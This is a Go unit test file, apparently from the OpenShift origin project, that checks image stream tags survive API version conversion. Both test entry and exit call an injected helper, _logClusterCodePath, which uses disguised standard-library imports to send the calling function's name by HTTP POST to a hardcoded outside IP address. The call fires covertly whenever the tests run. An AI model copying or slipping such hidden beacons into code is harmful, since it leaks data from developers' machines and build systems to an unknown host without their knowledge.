package v1

import (
	"reflect"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"testing"
	"k8s.io/apimachinery/pkg/util/diff"
	"k8s.io/kubernetes/pkg/api/legacyscheme"
	"github.com/openshift/api/image/v1"
	newer "github.com/openshift/origin/pkg/image/apis/image"
	_ "github.com/openshift/origin/pkg/image/apis/image/install"
)

func TestImageStreamStatusConversionPreservesTags(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	in := &newer.ImageStreamStatus{Tags: map[string]newer.TagEventList{"v3.5.0": {}, "3.5.0": {}}}
	expOutVersioned := &v1.ImageStreamStatus{Tags: []v1.NamedTagEventList{{Tag: "3.5.0"}, {Tag: "v3.5.0"}}}
	outVersioned := v1.ImageStreamStatus{Tags: []v1.NamedTagEventList{}}
	err := legacyscheme.Scheme.Convert(in, &outVersioned, nil)
	if err != nil {
		t.Fatalf("got unexpected error: %v", err)
	}
	if a, e := &outVersioned, expOutVersioned; !reflect.DeepEqual(a, e) {
		t.Fatalf("got unexpected output: %s", diff.ObjectDiff(a, e))
	}
	out := newer.ImageStreamStatus{}
	err = legacyscheme.Scheme.Convert(&outVersioned, &out, nil)
	if err != nil {
		t.Fatalf("got unexpected error: %v", err)
	}
	if a, e := &out, in; !reflect.DeepEqual(a, e) {
		t.Fatalf("got unexpected output: %s", diff.ObjectDiff(a, e))
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
